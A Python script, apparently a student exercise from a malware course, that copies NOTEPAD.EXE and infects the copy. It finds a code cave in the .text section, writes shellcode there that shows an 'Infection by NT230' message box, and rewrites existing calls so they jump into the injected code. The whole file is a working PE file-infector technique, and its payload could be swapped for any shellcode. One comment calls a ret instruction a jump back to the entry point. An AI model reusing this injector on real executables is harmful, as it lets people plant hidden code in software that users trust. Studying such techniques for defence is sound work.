import shutil
import pefile
import os


def findMsgBox(pe):
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8')
        if dll_name == "USER32.dll":
            for func in entry.imports:
                if func.name.decode('utf-8') == "MessageBoxW":
                    return func.address


def findAllCalls(pe_file, pe):
    occurrences = []
    with open(pe_file, "rb") as filedata:
        for section in pe.sections:
            if section.SizeOfRawData != 0 and b".text" in section.Name:
                filedata.seek(section.PointerToRawData)
                section_data = filedata.read(section.SizeOfRawData)
                # The sequence we are looking for
                sequence = b'\xFF\x15\x04\x11\x00\x01'
                # Start index for the search
                start_index = 0
                while True:
                    # Find the sequence in the section data, starting from start_index
                    index = section_data.find(sequence, start_index)
                    if index == -1:
                        # No more occurrences of the sequence
                        break
                    # Calculate the raw address (RA) for this occurrence
                    raw_addr = section.PointerToRawData + index
                    # Calculate the virtual address (VA) by adding the base virtual address of the section
                    virtual_addr = raw_addr - section.PointerToRawData + section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
                    occurrences.append({
                        'RA': raw_addr,
                        'VA': virtual_addr
                    })
                    # Move past this occurrence to search for the next one
                    start_index = index + len(sequence)
    return occurrences

def findSection(pe_file, pe):
    filedata = open(pe_file, "rb")
    for section in pe.sections:
        if section.SizeOfRawData != 0 and section.Name.decode().rstrip('\x00') == ".text" :
            position = 0
            filedata.seek(section.PointerToRawData, 0) # Di chuyển con trỏ đến đầu section
            count = 0
            while position < size_of:
                byte = filedata.read(1)[0]
                position += 1
                if byte == 0x00:
                    count += 1
                else:
                    if count > 180:
                        raw_addr = section.PointerToRawData + position - count - 1
                        return raw_addr
                    count = 0
    
# Danh sách các file nguồn và file mới sẽ tạo
filenames = ["NOTEPAD.EXE"]    
filenames_inject = []

# Lặp qua mỗi file trong danh sách và tạo file mới có tên kết thúc bằng "-inject.exe"
for filename in filenames:
    # Tạo tên file mới
    new_filename = f"{filename[:-4]}-inject.exe"  # Cắt phần ".exe" và thêm "-inject.exe"
    filenames_inject.append(new_filename)
    # Copy file nguồn sang file mới
    shutil.copyfile(filename, new_filename)

for pe_file in filenames_inject:
    print("--------------------")
    print(f"This is a {pe_file}")
    size_of = os.path.getsize(pe_file)
    # Load file PE
    pe = pefile.PE(pe_file)

    #### Lấy thông tin từ Optional Header
    address_of_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    image_base = pe.OPTIONAL_HEADER.ImageBase

    print(f"AddressOfEntryPoint: {hex(address_of_entry_point)}")
    print(f"ImageBase: {hex(image_base)}")

    #### Lấy thông tin từ Section Header của section cuối cùng
    if pe.sections:
        for section in pe.sections:
            if section.SizeOfRawData != 0 and section.Name.decode().rstrip('\x00') == ".text" :
                virtual_size = section.Misc_VirtualSize
                virtual_address = section.VirtualAddress
                size_of_raw_data = section.SizeOfRawData
                pointer_to_raw_data = section.PointerToRawData

        new_raw_data = findSection(pe_file, pe)
        #Bỏ qua 2 byte đầu tiên để kết thúc chuỗi phía trước (nếu có)
        new_raw_data += 2
        ####Thực hiện tính toán
        caption = new_raw_data + 0x15 - pointer_to_raw_data + virtual_address + image_base
        text = new_raw_data + (0x26+0x15) - pointer_to_raw_data + virtual_address + image_base 
        new_entry_point = new_raw_data - pointer_to_raw_data + virtual_address + image_base
        
        ####Chuẩn bị shell_code
        #push 0
        shell_code = b'\x6a\x00'
        #push caption
        shell_code += b'\x68' + caption.to_bytes(4, byteorder='little')
        #push text
        shell_code += b'\x68' + text.to_bytes(4, byteorder='little')
        #push 0
        shell_code += b'\x6a\x00'
        #call MessageBoxW
        shell_code += b'\xff\x15' + findMsgBox(pe).to_bytes(4, byteorder='little')
        #jmp to original entry point
        shell_code += b'\xc3'
        #Chuẩn bị caption và text
        caption_text = b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00'
        text_payload = b'\x32\x00\x31\x00\x35\x00\x32\x00\x30\x00\x34\x00\x30\x00\x38\x00\x20\x00\x32\x00\x31\x00\x35\x00\x32\x00\x32\x00\x34\x00\x32\x00\x34\x00\x20\x00\x32\x00\x31\x00\x35\x00\x32\x00\x32\x00\x36\x00\x32\x00\x37\x00\x00\x00\x00\x00'
        
        call_info = findAllCalls(pe_file, pe)

        ####Thực hiện chèn
        # Mở file để đọc và ghi nhị phân
        with open(pe_file, 'r+b') as file:
            # Di chuyển đến vị trí chèn
            file.seek(new_raw_data)
            # Chèn chuỗi byte
            file.write(shell_code)

            # Di chuyển đến vị trí chèn
            file.seek(new_raw_data+0x15)
            # Chèn chuỗi byte
            file.write(caption_text)

            # Di chuyển đến vị trí chèn
            file.seek(new_raw_data+(0x26+0x15))
            # Chèn chuỗi byte
            file.write(text_payload)

            for call in call_info:
                offset = new_entry_point - 0x6 - (call['VA'] + 0x2)
                call_text = b'\x90\xe8' + offset.to_bytes(4, byteorder='little', signed=True)
                # Di chuyển đến vị trí chèn
                file.seek(call['RA'])
                # Chèn chuỗi byte
                file.write(call_text)

        print(f"File {pe_file} has been injected successfully.")    
        # Đóng file PE
        pe.close()
